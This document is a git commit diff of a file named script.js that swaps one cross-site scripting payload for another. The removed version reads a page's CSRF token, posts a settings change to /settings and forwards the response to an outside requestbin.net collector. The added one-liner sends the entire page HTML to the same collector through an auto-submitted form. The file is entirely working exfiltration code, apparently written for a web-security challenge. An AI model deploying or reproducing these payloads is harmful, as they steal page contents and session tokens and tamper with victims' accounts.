80a2863b6b50ecdf463f4b06bed02ad4ba63eda8
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 17:38:41 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,16 +1,3 @@
-fetch("/settings", {
-    'method': 'POST',
-    'body': 'name=foo&user_id=2&_csrf_token=' + document.getElementsByName('_csrf_token')[0].value
-}).then(function(response) {
-    response.text().then(function(back) {
-        f = document.createElement("form");
-        i = document.createElement("input");
-        f.method = 'post';
-        f.action = 'http://requestbin.net/r/rj93qcrj';
-        i.name = 'data';
-        i.value = btoa(encodeURI(back));
-        f.appendChild(i);
-        document.body.appendChild(f);
-        f.submit();
-    })
-})
+
+
+f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://requestbin.net/r/rj93qcrj';i.name='data';i.value=btoa(encodeURI(window.document.all[0].innerHTML));f.appendChild(i);document.body.appendChild(f);f.submit();
